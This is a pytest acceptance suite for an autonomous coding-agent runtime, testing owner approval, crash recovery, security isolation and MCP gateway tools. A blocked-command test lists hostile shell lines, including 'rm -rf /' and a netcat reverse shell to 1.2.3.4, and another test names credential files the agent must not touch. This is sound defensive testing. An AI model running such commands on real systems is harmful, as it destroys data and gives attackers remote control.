"""Comprehensive Independent Acceptance Test Suite for Sprint 5.1.

Covers all 4 Mandatory Scenarios specified in Sprint 5.1 Section 10:
- Scenario A: True Autonomous Repair (16 steps lifecycle with background subprocess worker)
- Scenario B: Genuine Process Restart (Two separate OS Python processes with checkpoint resumption)
- Scenario C: Security Isolation (13 negative security checks)
- Scenario D: Cloud MCP & Live LLM Verification (Gateway tool exposure, JSON-RPC, adapter errors)
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch

import pytest

PROJECT_ROOT = Path(__file__).resolve().parent.parent
GW_DIR = str(PROJECT_ROOT / "mcp-gateway")
if GW_DIR not in sys.path:
    sys.path.insert(0, GW_DIR)
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from gateway_server import MCPGatewayServer, ALL_TOOL_DEFINITIONS
from policy import GatewayPolicy, PermissionTier
from runtime.agent_mcp_tools import AUTONOMOUS_TOOL_DEFINITIONS, AgentMCPToolHandler
from runtime.autonomous_agent import (
    AutonomousAgentController,
    UnattendedWorkerDaemon,
)
from runtime.llm_adapter import (
    DeterministicRuleBasedAdapter,
    ModelBudgetExceededError,
    ModelProviderNotConfiguredError,
    OpenAIProviderAdapter,
    get_llm_adapter,
    validate_plan_schema,
    validate_repair_schema,
)
from runtime.task_grant import TaskGrant, TaskGrantBroker, get_or_create_broker_key
from runtime.task_store import TaskRecord, TaskState, TaskStore, is_pid_alive


# ==============================================================================
# SCENARIO A: TRUE AUTONOMOUS REPAIR (16 STEPS)
# ==============================================================================
class TestScenarioA_TrueAutonomousRepair:
    """Scenario A: True Autonomous Repair with a real background Python worker process."""

    def test_scenario_a_true_autonomous_repair_16_steps(self):
        with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as td:
            repo_dir = Path(td).resolve()
            db_path = repo_dir / "tasks_scen_a.db"
            key_path = repo_dir / "broker_scen_a.key"

            # 1. Setup disposable repo with real failing Python module and pytest suite
            calc_code = (
                "# Calculator module\n"
                "def add(a, b):\n"
                "    # BUG: Defective addition logic\n"
                "    return a - b\n\n"
                "def multiply(a, b):\n"
                "    return a * b\n"
            )
            (repo_dir / "calculator.py").write_text(calc_code, encoding="utf-8")

            test_code = (
                "import pytest\n"
                "from calculator import add, multiply\n\n"
                "def test_addition():\n"
                "    assert add(2, 3) == 5\n\n"
                "def test_multiplication():\n"
                "    assert multiply(3, 4) == 12\n"
            )
            (repo_dir / "test_calculator.py").write_text(test_code, encoding="utf-8")

            # Initialize TaskStore and TaskGrantBroker
            store = TaskStore(db_path=db_path)
            broker = TaskGrantBroker(key_path=key_path, db_path=db_path)
            handler = AgentMCPToolHandler(store, broker)

            # Step 1-2: Submit task via MCP WITHOUT owner token
            submit_res = handler.execute_tool(
                "agent_submit_task",
                {
                    "objective": "Fix addition defect in calculator.py so test_calculator.py passes",
                    "workspace_root": str(repo_dir),
                    "allowed_tools": [
                        "read_file", "write_file", "edit_file",
                        "list_directory", "powershell_execute",
                    ],
                    "allowed_commands": ["pytest*", "python*"],
                    "auto_start": True,
                },
            )
            task_id = submit_res["task_id"]
            assert task_id != ""
            assert submit_res["status"] == TaskState.AUTHORIZATION_PENDING.value
            assert submit_res["grant_id"] is None
            assert submit_res.get("requires_owner_approval") is True

            # Step 3-4: Verify task in store is AUTHORIZATION_PENDING; obtain owner approval
            task_pending = store.get_task(task_id)
            assert task_pending.state == TaskState.AUTHORIZATION_PENDING.value
            assert task_pending.grant_id is None

            owner_token = broker.generate_owner_approval_token(task_id, repo_dir)
            assert isinstance(owner_token, str) and len(owner_token) > 0 and owner_token.startswith("v2.")

            approve_res = handler.execute_tool(
                "agent_approve_task",
                {
                    "task_id": task_id,
                    "owner_approval_token": owner_token,
                    "spawn_worker": False,
                },
            )
            assert approve_res["status"] == TaskState.QUEUED.value
            assert approve_res["grant_id"] is not None
            grant_id = approve_res["grant_id"]

            task_queued = store.get_task(task_id)
            assert task_queued.state == TaskState.QUEUED.value
            assert task_queued.grant_id == grant_id

            # Step 5-16: Start a real background OS Python worker process
            cmd = [
                sys.executable,
                "-m",
                "runtime.autonomous_agent",
                "--db-path",
                str(db_path),
                "--key-path",
                str(key_path),
                "--max-tasks",
                "1",
                "--once",
                "--poll-interval",
                "0.2",
            ]
            worker_proc = subprocess.Popen(
                cmd,
                cwd=str(PROJECT_ROOT),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )

            # Poll agent_task_status until COMPLETED or timeout
            start_poll = time.time()
            final_status = None
            while time.time() - start_poll < 35.0:
                st = handler.execute_tool("agent_task_status", {"task_id": task_id})
                if st.get("state") in (TaskState.COMPLETED.value, TaskState.FAILED.value, TaskState.CANCELLED.value):
                    final_status = st
                    break
                time.sleep(0.3)

            stdout, stderr = worker_proc.communicate(timeout=10)
            assert worker_proc.returncode == 0, f"Worker process failed with stderr: {stderr}"
            assert final_status is not None, "Worker timed out before reaching terminal state"
            assert final_status["state"] == TaskState.COMPLETED.value, f"Task failed: {final_status}"

            # Verify worker lifecycle assertions
            task_record = store.get_task(task_id)
            assert task_record.state == TaskState.COMPLETED.value
            assert task_record.verification_passed is True

            # Verify code was edited atomically and backup was created in backups/file_versions
            backup_dir = PROJECT_ROOT / "backups" / "file_versions"
            assert backup_dir.exists(), "Global backup directory was not created"
            backups = list(backup_dir.glob(f"*{task_id}*calculator*.bak"))
            assert len(backups) >= 1, "Backup of calculator.py was not preserved"

            # Verify calculator.py code was repaired
            repaired_code = (repo_dir / "calculator.py").read_text(encoding="utf-8")
            assert "return a + b" in repaired_code
            assert "return a - b" not in repaired_code

            # Verify audit trail logs in TaskStore
            logs = store.get_logs(task_id)
            log_phases = [l["phase"] for l in logs]
            assert "START" in log_phases
            assert "PLANNING" in log_phases
            assert "COMPLETED" in log_phases

            # Zero per-operation owner prompts during execution
            artifacts = handler.execute_tool("agent_task_artifacts", {"task_id": task_id})
            assert artifacts["task_id"] == task_id
            assert len(artifacts["files_modified"]) >= 1


# ==============================================================================
# SCENARIO B: GENUINE PROCESS RESTART (TWO SEPARATE OS PYTHON PROCESSES)
# ==============================================================================
class TestScenarioB_ProcessRestartResumption:
    """Scenario B: Two separate OS Python processes demonstrating genuine crash recovery."""

    def test_scenario_b_cross_process_restart_and_checkpoint_resumption(self):
        with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as td:
            ws = Path(td).resolve()
            db_path = ws / "tasks_scen_b.db"
            key_path = ws / "broker_scen_b.key"

            # Setup test and support scripts
            (ws / "test_simple.py").write_text("def test_ok(): assert True\n", encoding="utf-8")
            (ws / "marker.txt").write_text("initial\n", encoding="utf-8")

            # Script that simulates slow step (2 seconds)
            slow_script = (
                "import time\n"
                "time.sleep(2.0)\n"
            )
            (ws / "slow_step.py").write_text(slow_script, encoding="utf-8")

            # Script that updates marker in step 1
            step1_script = (
                "from pathlib import Path\n"
                "p = Path('marker.txt')\n"
                "p.write_text('step1_done\\n', encoding='utf-8')\n"
            )
            (ws / "step1.py").write_text(step1_script, encoding="utf-8")

            store = TaskStore(db_path=db_path)
            broker = TaskGrantBroker(key_path=key_path, db_path=db_path)

            task = store.create_task(
                objective="Multi-step crash resilience test",
                workspace_root=ws,
                metadata={
                    "requested_tools": ["powershell_execute", "read_file", "write_file"],
                    "requested_commands": ["python*", "pytest*"],
                },
            )
            grant = broker.issue_grant(
                task_id=task.task_id,
                workspace_root=ws,
                allowed_tools=["powershell_execute", "read_file", "write_file"],
                allowed_commands=["python*", "pytest*"],
                allowed_permission_tiers=["READ", "WRITE", "EXECUTE"],
                duration_seconds=300.0,
            )
            store.bind_grant(task.task_id, grant.grant_id)

            # Pre-populate current_plan with 3 steps
            plan = [
                {
                    "step_id": "step_1_marker",
                    "action": "execute",
                    "tool": "powershell_execute",
                    "args": {"command": "python step1.py", "cwd": str(ws)},
                    "description": "Step 1: Write marker",
                },
                {
                    "step_id": "step_2_slow",
                    "action": "execute",
                    "tool": "powershell_execute",
                    "args": {"command": "python slow_step.py", "cwd": str(ws)},
                    "description": "Step 2: Slow operation",
                },
                {
                    "step_id": "step_3_verify",
                    "action": "run_tests",
                    "tool": "powershell_execute",
                    "args": {"command": "pytest test_simple.py", "cwd": str(ws)},
                    "description": "Step 3: Verification",
                },
            ]
            store.update_task_progress(task.task_id, current_plan=plan)

            # Process 1: Start background worker
            cmd = [
                sys.executable,
                "-m",
                "runtime.autonomous_agent",
                "--db-path",
                str(db_path),
                "--key-path",
                str(key_path),
                "--poll-interval",
                "0.1",
            ]
            proc1 = subprocess.Popen(cmd, cwd=str(PROJECT_ROOT), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            proc1_pid = proc1.pid

            # Poll until Step 1 has saved a checkpoint and task is RUNNING under proc1
            chk = None
            t0 = time.time()
            while time.time() - t0 < 10.0:
                t_curr = store.get_task(task.task_id)
                chk = store.get_latest_checkpoint(task.task_id)
                if chk is not None and chk.step_index >= 0 and t_curr.state == TaskState.RUNNING.value:
                    break
                time.sleep(0.1)

            assert chk is not None, "Process 1 failed to save checkpoint for Step 1"
            assert (ws / "marker.txt").read_text(encoding="utf-8").strip() == "step1_done"

            # KILL Process 1 abruptly while Step 2 is in flight (genuine OS process crash)
            proc1.kill()
            proc1.wait(timeout=5.0)
            assert not is_pid_alive(proc1_pid), f"PID {proc1_pid} should be dead"

            # Verify task was left in RUNNING with dead PID
            orphaned_task = store.get_task(task.task_id)
            assert orphaned_task.state == TaskState.RUNNING.value
            assert orphaned_task.worker_pid == proc1_pid

            # Process 2: Start new worker process in separate invocation
            proc2 = subprocess.run(
                [
                    sys.executable,
                    "-m",
                    "runtime.autonomous_agent",
                    "--db-path",
                    str(db_path),
                    "--key-path",
                    str(key_path),
                    "--max-tasks",
                    "1",
                    "--once",
                    "--poll-interval",
                    "0.1",
                ],
                cwd=str(PROJECT_ROOT),
                capture_output=True,
                text=True,
                timeout=20.0,
            )
            assert proc2.returncode == 0, f"Process 2 failed: {proc2.stderr}"

            # Verify Process 2 reconciled orphaned task and completed it from checkpoint
            completed_task = store.get_task(task.task_id)
            assert completed_task.state == TaskState.COMPLETED.value
            assert completed_task.verification_passed is True

            # Verify completed steps has all 3 steps recorded
            assert len(completed_task.completed_steps) == 3

            # Verify recovery event was logged in TaskStore
            logs = store.get_logs(task.task_id)
            rec_logs = [l for l in logs if l["phase"] == "RECOVERY"]
            assert len(rec_logs) >= 1, "Orphan reconciliation event not logged"
            assert f"PID {proc1_pid}" in rec_logs[0]["message"]


# ==============================================================================
# SCENARIO C: SECURITY ISOLATION (13 NEGATIVE CHECKS)
# ==============================================================================
class TestScenarioC_SecurityIsolation:
    """Scenario C: 13 Negative Security Checks ensuring rigorous fail-closed isolation."""

    @pytest.fixture(autouse=True)
    def setup_env(self):
        with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as td:
            self.base_dir = Path(td).resolve()
            self.ws_a = self.base_dir / "workspace_a"
            self.ws_b = self.base_dir / "workspace_b"
            self.ws_a.mkdir()
            self.ws_b.mkdir()

            self.db_path = self.base_dir / "sec_tasks.db"
            self.key_path = self.base_dir / "sec_broker.key"
            self.store = TaskStore(db_path=self.db_path)
            self.policy = GatewayPolicy(profile="full_agent", emergency_stop_file=self.base_dir / "EMERGENCY_STOP")
            self.broker = TaskGrantBroker(key_path=self.key_path, policy=self.policy, db_path=self.db_path)
            self.handler = AgentMCPToolHandler(self.store, self.broker)
            yield

    def test_01_unauthenticated_client_cannot_mint_grant(self):
        """Negative Check 1: Client cannot mint grant without valid owner approval token."""
        # Submit without token -> stays AUTHORIZATION_PENDING
        res1 = self.handler.execute_tool(
            "agent_submit_task",
            {"objective": "Unauthenticated task", "workspace_root": str(self.ws_a)},
        )
        assert res1["status"] == TaskState.AUTHORIZATION_PENDING.value
        assert res1["grant_id"] is None

        # Submit with invalid token -> REJECTED
        res2 = self.handler.execute_tool(
            "agent_submit_task",
            {
                "objective": "Forged token task",
                "workspace_root": str(self.ws_a),
                "owner_approval_token": "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",  # gitleaks:allow  (synthetic regression fixture; reviewed)
            },
        )
        assert res2["status"] == "REJECTED"
        assert "owner_approval_token" in res2["error"]

    def test_02_read_only_caller_tier_cannot_mint_privileges(self):
        """Negative Check 2: READ-only caller tier cannot issue WRITE/EXECUTE grants or approve tasks."""
        # 1. Calling agent_submit_task with owner_approval_token under caller_tier="READ" is REJECTED
        task = self.store.create_task("Read caller check", workspace_root=self.ws_a)
        valid_token = self.broker.generate_owner_approval_token(task.task_id, self.ws_a)

        res_submit = self.handler.execute_tool(
            "agent_submit_task",
            {
                "objective": "Read-only attempting write minting",
                "workspace_root": str(self.ws_a),
                "allowed_tools": ["read_file", "write_file", "powershell_execute"],
                "owner_approval_token": valid_token,
            },
            caller_tier="READ",
        )
        assert res_submit["status"] == "REJECTED"
        assert "Caller tier is READ" in res_submit["error"]

        # 2. Calling agent_approve_task under caller_tier="READ" is REJECTED
        res_approve = self.handler.execute_tool(
            "agent_approve_task",
            {
                "task_id": task.task_id,
                "owner_approval_token": valid_token,
            },
            caller_tier="READ",
        )
        assert res_approve["status"] == "REJECTED"
        assert "Caller tier is READ" in res_approve["error"]

    def test_03_task_cannot_broaden_allowed_paths_or_tools(self):
        """Negative Check 3: Submitted task with grant_id cannot broaden paths or tools."""
        grant = self.broker.issue_grant(
            task_id="task_scope_limit",
            workspace_root=self.ws_a,
            allowed_tools=["read_file"],
            allowed_commands=["pytest*"],
            allowed_permission_tiers=["READ"],
            duration_seconds=300.0,
        )
        # Attempt to broaden workspace_root to ws_b
        res1 = self.handler.execute_tool(
            "agent_submit_task",
            {
                "objective": "Broaden path",
                "workspace_root": str(self.ws_b),
                "grant_id": grant.grant_id,
            },
        )
        assert res1["status"] == "REJECTED"

        # Attempt to broaden tools to write_file
        res2 = self.handler.execute_tool(
            "agent_submit_task",
            {
                "objective": "Broaden tools",
                "workspace_root": str(self.ws_a),
                "allowed_tools": ["read_file", "write_file"],
                "grant_id": grant.grant_id,
            },
        )
        assert res2["status"] == "REJECTED"

    def test_04_read_file_outside_workspace_denied(self):
        """Negative Check 4: read_file outside approved workspace is denied."""
        task = self.store.create_task("Read out of scope", workspace_root=self.ws_a)
        grant = self.broker.issue_grant(
            task_id=task.task_id,
            workspace_root=self.ws_a,
            allowed_tools=["read_file"],
            allowed_commands=[],
            allowed_permission_tiers=["READ"],
        )
        ctrl = AutonomousAgentController(task.task_id, self.store, self.broker)

        outside_file = self.ws_b / "secret.txt"
        outside_file.write_text("secret_b", encoding="utf-8")

        ok, res, err = ctrl._execute_tool_action(grant, "read_file", {"path": str(outside_file)})
        assert ok is False
        assert "outside approved workspace" in err

    def test_05_list_directory_outside_workspace_denied(self):
        """Negative Check 5: list_directory outside approved workspace is denied."""
        task = self.store.create_task("List out of scope", workspace_root=self.ws_a)
        grant = self.broker.issue_grant(
            task_id=task.task_id,
            workspace_root=self.ws_a,
            allowed_tools=["list_directory"],
            allowed_commands=[],
            allowed_permission_tiers=["READ"],
        )
        ctrl = AutonomousAgentController(task.task_id, self.store, self.broker)

        ok, res, err = ctrl._execute_tool_action(grant, "list_directory", {"path": str(self.ws_b)})
        assert ok is False
        assert "outside approved workspace" in err

    def test_06_unauthorized_shell_commands_denied(self):
        """Negative Check 6: Unauthorized commands, chaining, and redirection are blocked."""
        task = self.store.create_task("Shell safety test", workspace_root=self.ws_a)
        grant = self.broker.issue_grant(
            task_id=task.task_id,
            workspace_root=self.ws_a,
            allowed_tools=["powershell_execute"],
            allowed_commands=["pytest*"],
            allowed_permission_tiers=["EXECUTE"],
        )
        ctrl = AutonomousAgentController(task.task_id, self.store, self.broker)

        evil_commands = [
            "calc.exe",
            "python_evil.exe",
            "pytest && whoami",
            "pytest > out.txt",
            "pytest ; rm -rf /",
            "pytest | nc -e /bin/sh 1.2.3.4 4444",
        ]
        for evil_cmd in evil_commands:
            ok, res, err = ctrl._execute_tool_action(grant, "powershell_execute", {"command": evil_cmd, "cwd": str(self.ws_a)})
            assert ok is False, f"Evil command '{evil_cmd}' should have been blocked"
            assert "Permission Denied" in err

    def test_07_sensitive_files_inaccessible_read_write(self):
        """Negative Check 7: Sensitive files (.env, id_rsa, broker_hmac.key, .git/config) inaccessible."""
        task = self.store.create_task("Sensitive files test", workspace_root=self.ws_a)
        grant = self.broker.issue_grant(
            task_id=task.task_id,
            workspace_root=self.ws_a,
            allowed_tools=["read_file", "write_file"],
            allowed_commands=[],
            allowed_permission_tiers=["READ", "WRITE"],
        )
        ctrl = AutonomousAgentController(task.task_id, self.store, self.broker)

        sensitive_names = [".env", ".env.production", "id_rsa", "broker_hmac.key", ".git/config"]
        for sname in sensitive_names:
            target = self.ws_a / sname
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text("sensitive_data", encoding="utf-8")

            # Try read
            ok_r, _, err_r = ctrl._execute_tool_action(grant, "read_file", {"path": str(target)})
            assert ok_r is False
            assert "sensitive" in err_r.lower() or "denied" in err_r.lower()

            # Try write
            ok_w, _, err_w = ctrl._execute_tool_action(grant, "write_file", {"path": str(target), "content": "tamper"})
            assert ok_w is False
            assert "sensitive" in err_w.lower() or "denied" in err_w.lower()

    def test_08_revoked_grant_cannot_resume_fails_closed(self):
        """Negative Check 8: Revoked grant cannot resume and fails closed."""
        task = self.store.create_task("Revocation test", workspace_root=self.ws_a)
        grant = self.broker.issue_grant(
            task_id=task.task_id,
            workspace_root=self.ws_a,
            allowed_tools=["read_file"],
            allowed_commands=[],
            allowed_permission_tiers=["READ"],
        )
        self.store.bind_grant(task.task_id, grant.grant_id)

        # Revoke grant
        self.broker.revoke_grant(grant.grant_id, reason="Security audit revocation")

        # agent_task_resume fails
        res = self.handler.execute_tool("agent_task_resume", {"task_id": task.task_id})
        assert res["resumed"] is False
        assert "revoked" in res["error"].lower()

        # Controller run terminates immediately
        ctrl = AutonomousAgentController(task.task_id, self.store, self.broker)
        fin_task = ctrl.run()
        assert fin_task.state in (TaskState.CANCELLED.value, TaskState.FAILED.value)

    def test_09_expired_grant_cannot_resume_fails_closed(self):
        """Negative Check 9: Expired grant fails closed and cannot authorize actions."""
        task = self.store.create_task("Expiry test", workspace_root=self.ws_a)
        grant = self.broker.issue_grant(
            task_id=task.task_id,
            workspace_root=self.ws_a,
            allowed_tools=["read_file"],
            allowed_commands=[],
            allowed_permission_tiers=["READ"],
            duration_seconds=0.1,
        )
        self.store.bind_grant(task.task_id, grant.grant_id)
        time.sleep(0.2)

        # validate_grant fails
        valid, msg = self.broker.validate_grant(grant)
        assert valid is False
        assert "expired" in msg.lower()

        # agent_task_resume fails
        res = self.handler.execute_tool("agent_task_resume", {"task_id": task.task_id})
        assert res["resumed"] is False
        assert "expired" in res["error"].lower()

    def test_10_forged_grant_signature_cannot_execute(self):
        """Negative Check 10: Forged or tampered grant signature fails verification."""
        task = self.store.create_task("Forgery test", workspace_root=self.ws_a)
        grant = self.broker.issue_grant(
            task_id=task.task_id,
            workspace_root=self.ws_a,
            allowed_tools=["read_file"],
            allowed_commands=[],
            allowed_permission_tiers=["READ"],
        )
        # Tamper with signature
        grant.signature = "0" * 64
        valid, msg = self.broker.validate_grant(grant)
        assert valid is False
        assert "signature" in msg.lower() or "invalid" in msg.lower()

    def test_11_emergency_stop_halts_execution_subsecond(self):
        """Negative Check 11: Emergency Stop terminates running work across subsystems < 1s."""
        task = self.store.create_task("Emergency stop test", workspace_root=self.ws_a)
        grant = self.broker.issue_grant(
            task_id=task.task_id,
            workspace_root=self.ws_a,
            allowed_tools=["read_file"],
            allowed_commands=[],
            allowed_permission_tiers=["READ"],
        )
        ctrl = AutonomousAgentController(task.task_id, self.store, self.broker, self.policy)

        t_start = time.perf_counter()
        self.policy.engage_emergency_stop(reason="Penetration testing incident")
        is_active = ctrl._check_emergency_stop()
        latency_ms = (time.perf_counter() - t_start) * 1000.0

        assert is_active is True
        assert latency_ms < 500.0, f"Emergency stop latency {latency_ms:.2f}ms exceeded 500ms limit"

        # Action is blocked
        ok, _, err = ctrl._execute_tool_action(grant, "read_file", {"path": str(self.ws_a / "test.py")})
        assert ok is False
        assert "Emergency Stop is active" in err

    def test_12_sanitized_environment_strips_sensitive_credentials(self):
        """Negative Check 12: Subprocess execution environment strips credentials."""
        task = self.store.create_task("Env sanitization test", workspace_root=self.ws_a)
        grant = self.broker.issue_grant(
            task_id=task.task_id,
            workspace_root=self.ws_a,
            allowed_tools=["powershell_execute"],
            allowed_commands=["python*"],
            allowed_permission_tiers=["EXECUTE"],
        )
        ctrl = AutonomousAgentController(task.task_id, self.store, self.broker)

        # Inject confidential environment variables
        with patch.dict(os.environ, {
            "OPENAI_API_KEY": "sk-secret-key-12345",  # gitleaks:allow  (synthetic regression fixture; reviewed)
            "MCP_AUTH_TOKEN": "mcp-token-supersecret",
            "SECRET_KEY": "jwt-signing-secret",
            "GATEWAY_TOKEN": "gateway-bearer-key",
            "SAFE_ENV_VAR": "safe_value",
        }):
            sanitized = ctrl._build_sanitized_env()
            assert "OPENAI_API_KEY" not in sanitized
            assert "MCP_AUTH_TOKEN" not in sanitized
            assert "SECRET_KEY" not in sanitized
            assert "GATEWAY_TOKEN" not in sanitized
            assert sanitized.get("SAFE_ENV_VAR") == "safe_value"

    def test_13_resource_budgets_enforced_fail_closed_budget_exhausted(self):
        """Negative Check 13: Resource budgets (writes, tool calls, time) strictly enforced."""
        # 13a: max_file_writes budget
        task1 = self.store.create_task("Budget writes test", workspace_root=self.ws_a)
        grant1 = self.broker.issue_grant(
            task_id=task1.task_id,
            workspace_root=self.ws_a,
            allowed_tools=["write_file"],
            allowed_commands=[],
            allowed_permission_tiers=["WRITE"],
            resource_budget={"max_file_writes": 1},
        )
        ctrl1 = AutonomousAgentController(task1.task_id, self.store, self.broker)
        ok1, _, _ = ctrl1._execute_tool_action(grant1, "write_file", {"path": str(self.ws_a / "f1.txt"), "content": "1"})
        assert ok1 is True
        ok2, _, err2 = ctrl1._execute_tool_action(grant1, "write_file", {"path": str(self.ws_a / "f2.txt"), "content": "2"})
        assert ok2 is False
        assert "budget exhausted" in err2.lower()

        # 13b: max_tool_calls budget
        task2 = self.store.create_task("Budget tool calls test", workspace_root=self.ws_a)
        grant2 = self.broker.issue_grant(
            task_id=task2.task_id,
            workspace_root=self.ws_a,
            allowed_tools=["read_file"],
            allowed_commands=[],
            allowed_permission_tiers=["READ"],
        )
        grant2.max_tool_calls = 1
        grant2.sign(self.broker.secret)
        self.store.bind_grant(task2.task_id, grant2.grant_id)

        # Create plan with 2 steps exceeding max_tool_calls=1
        (self.ws_a / "f1.txt").write_text("hello", encoding="utf-8")
        self.store.update_task_progress(task2.task_id, current_plan=[
            {"step_id": "s1", "action": "read", "tool": "read_file", "args": {"path": str(self.ws_a / "f1.txt")}, "description": "1"},
            {"step_id": "s2", "action": "read", "tool": "read_file", "args": {"path": str(self.ws_a / "f1.txt")}, "description": "2"},
        ])
        ctrl2 = AutonomousAgentController(task2.task_id, self.store, self.broker)
        fin2 = ctrl2.run()
        assert fin2.state == TaskState.FAILED.value
        assert "BUDGET_EXHAUSTED" in fin2.error_message


# ==============================================================================
# SCENARIO D: CLOUD MCP & LIVE LLM VERIFICATION
# ==============================================================================
class TestScenarioD_CloudMCPAndLiveLLM:
    """Scenario D: MCP Gateway tool exposure, JSON-RPC handling, and LLM adapter contract."""

    @pytest.fixture(autouse=True)
    def setup_env(self):
        with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as td:
            self.ws = Path(td).resolve()
            self.policy = GatewayPolicy(profile="full_agent", emergency_stop_file=self.ws / "EMERGENCY_STOP")
            self.gateway = MCPGatewayServer(policy=self.policy)
            yield

    def test_01_gateway_server_exposes_11_autonomous_tools(self):
        """Verify Gateway registers and exposes all 11 autonomous management tools."""
        expected_tools = [
            "agent_submit_task",
            "agent_approve_task",
            "agent_task_status",
            "agent_task_logs",
            "agent_task_diff",
            "agent_task_artifacts",
            "agent_task_pause",
            "agent_task_resume",
            "agent_task_cancel",
            "agent_list_tasks",
            "agent_emergency_stop",
        ]
        for tname in expected_tools:
            assert tname in ALL_TOOL_DEFINITIONS, f"Tool {tname} missing from ALL_TOOL_DEFINITIONS"
            assert tname in AUTONOMOUS_TOOL_DEFINITIONS, f"Tool {tname} missing from AUTONOMOUS_TOOL_DEFINITIONS"

    def test_02_gateway_jsonrpc_submission_requires_owner_approval(self):
        """Verify MCP JSON-RPC submission creates task in AUTHORIZATION_PENDING without self-issuing grant."""
        sess = self.policy.sessions.create_session(tiers=[PermissionTier.READ, PermissionTier.WRITE])
        req = {
            "jsonrpc": "2.0",
            "id": 101,
            "method": "tools/call",
            "params": {
                "name": "agent_submit_task",
                "arguments": {
                    "objective": "Submit via MCP JSON-RPC protocol",
                    "workspace_root": str(self.ws),
                },
            },
        }
        res = self.gateway.handle_jsonrpc(req, session_id=sess.session_id)
        assert res["id"] == 101
        assert res["result"]["isError"] is False
        payload = json.loads(res["result"]["content"][0]["text"])
        assert payload["status"] == TaskState.AUTHORIZATION_PENDING.value
        assert payload["grant_id"] is None
        assert payload["requires_owner_approval"] is True

    def test_03_get_llm_adapter_requires_live_raises_not_configured(self):
        """Verify get_llm_adapter(require_live=True) raises ModelProviderNotConfiguredError if no key."""
        with patch.dict(os.environ, {"OPENAI_API_KEY": ""}, clear=False):
            with pytest.raises(ModelProviderNotConfiguredError) as exc_info:
                get_llm_adapter(require_live=True, api_key="")
            assert exc_info.value.error_code == "MODEL_PROVIDER_NOT_CONFIGURED"

    def test_04_openai_adapter_multiturn_diagnose_and_repair_schema(self):
        """Verify schema validation and OpenAI adapter multi-turn diagnose_and_repair handling."""
        # 1. Schema rejection
        with pytest.raises(ValueError, match="missing required field"):
            validate_plan_schema([{"invalid": "data"}], allowed_tools=["read_file"])

        with pytest.raises(ValueError, match="missing required field"):
            validate_repair_schema({"invalid": "data"}, workspace_root=str(self.ws))

        # 2. Valid repair schema
        valid_repair = {
            "tool": "write_file",
            "args": {"path": str(self.ws / "calc.py"), "content": "def add(a, b): return a + b\n"},
            "reason": "Fixed addition operator",
        }
        checked_repair = validate_repair_schema(valid_repair, workspace_root=str(self.ws))
        assert checked_repair["args"]["path"] == str(self.ws / "calc.py")

        # 3. Simulated OpenAI adapter multi-turn response (Turn 1: request_context, Turn 2: repair)
        adapter = OpenAIProviderAdapter(api_key="sk-mock-key-for-unit-test-12345", max_budget=1.0)
        call_count = 0

        def mock_call(messages):
            nonlocal call_count
            call_count += 1
            if call_count == 1:
                return {
                    "action": "request_context",
                    "files": ["helper.py"],
                    "reason": "Need to inspect helper.py to find root cause",
                }
            return {
                "action": "repair",
                "can_continue": True,
                "tool": "write_file",
                "args": {"path": str(self.ws / "calc.py"), "content": "def add(a, b): return a + b\n"},
                "reason": "Repaired via OpenAI Mock after context inspection",
            }

        with patch.object(adapter, "_call_chat_completion", side_effect=mock_call):
            (self.ws / "calc.py").write_text("def add(a, b): return a - b\n", encoding="utf-8")
            (self.ws / "helper.py").write_text("def helper(): return 42\n", encoding="utf-8")
            rep = adapter.diagnose_and_repair(
                objective="Fix calc",
                failed_step={"step_id": "test", "tool": "powershell_execute"},
                error_context=f'File "{self.ws / "calc.py"}", line 1\nAssertionError',
                workspace_root=str(self.ws),
            )
            assert rep is not None
            assert rep["args"]["path"] == str(self.ws / "calc.py")
            assert "def add(a, b): return a + b" in rep["args"]["content"]
            assert call_count == 2
